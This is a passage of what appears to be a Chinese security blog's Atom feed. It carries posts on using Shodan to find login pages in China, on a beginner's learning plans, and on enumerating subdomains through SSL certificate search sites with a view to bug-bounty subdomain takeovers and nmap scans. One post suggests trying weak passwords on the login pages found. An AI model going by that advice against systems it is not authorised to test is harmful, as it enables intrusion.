没错关键字得分开写</div></pre></td></tr></table></figure><p>我目前常用的就这三个（确实用的有点少）</p><p>用上面的来举个例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http.title:登录 country:&quot;CN&quot;</div></pre></td></tr></table></figure><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191109140451.png" alt=""></p><p>配合弱口令也能收割一些漏洞，当然侧边的过滤条件也可以选择</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191109140704.png" alt=""></p><p>点击后会出现在搜索的条件中，shodan是不是很不错啊（前提你需要一个会员，没会员玩个蛋）</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="信息搜集" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    
    
      <category term="学习" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>自己太菜了</title>
    <link href="http://yoursite.com/2019/11/02/2019_11_2/"/>
    <id>http://yoursite.com/2019/11/02/2019_11_2/</id>
    <published>2019-11-02T04:23:27.000Z</published>
    <updated>2019-11-02T05:51:37.578Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>​    我写这话想到什么说什么，从小作文就不好    </p><p>​    我把之前的文章都删掉了，可能是因为自己大学并没有学到什么东西（大部分时间在考虑社团发展），导致自己没有好好规划自己的学习路线。这几天看到自己之前的写的像是在水文章一样，还不如删掉重新写。</p><p>​    以后打算专注Python当然其他的东西也要搞，不然只会Python感觉很Low不过这都是后话了，现在在一家甲方做安全，每天说真的事情不多，所以要充分利用时间学习，万一有大佬推荐，想想就激动。</p><p>​    </p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
    
      <category term="学习" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>如何找到更多的域名之SSL证书</title>
    <link href="http://yoursite.com/2019/10/13/%E5%A6%82%E4%BD%95%E6%89%BE%E5%88%B0%E6%9B%B4%E5%A4%9A%E7%9A%84%E5%9F%9F%E5%90%8D%E4%B9%8BSSL%E8%AF%81%E4%B9%A6/"/>
    <id>http://yoursite.com/2019/10/13/如何找到更多的域名之SSL证书/</id>
    <published>2019-10-13T08:13:36.000Z</published>
    <updated>2019-10-13T10:08:16.358Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h4 id="如何找到更多的域名之SSL证书"><a href="#如何找到更多的域名之SSL证书" class="headerlink" title="如何找到更多的域名之SSL证书"></a>如何找到更多的域名之SSL证书</h4><p>简单的来说就是服务器SSL证书，常见的网站前面的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.domain.com</div></pre></td></tr></table></figure><p>这里推荐一个网站certdb，当然除了这个还有几个网站，我感觉第一个挺不错的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">https://certdb.com</div><div class="line">https://crt.sh</div><div class="line">https://censys.io/</div></pre></td></tr></table></figure><p>那么，使用下</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191013173553.png" alt=""></p><p>这是一个英文网站，中间的搜索框写域名即可，这里举一个例子就是baidu</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/1570959603062.png" alt=""></p><p>点击DETAILS（详情），在新页面拉到底部</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191013174052.png" alt=""></p><p>一共4096个相关域名</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191013174555.png" alt=""></p><p>通过这张图能获得许多信息，可以挖各种漏洞，比如子域名接管（hackerone给的特别多，还是美刀）</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191013174456.png" alt=""></p><p>在上张图片的下面还能看到一些网段，里面可能就有这家公司的专属网段，用nmap查开放端口、找中间件漏洞</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191013180759.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="信息搜集" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    
    
      <category term="学习" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
</feed>
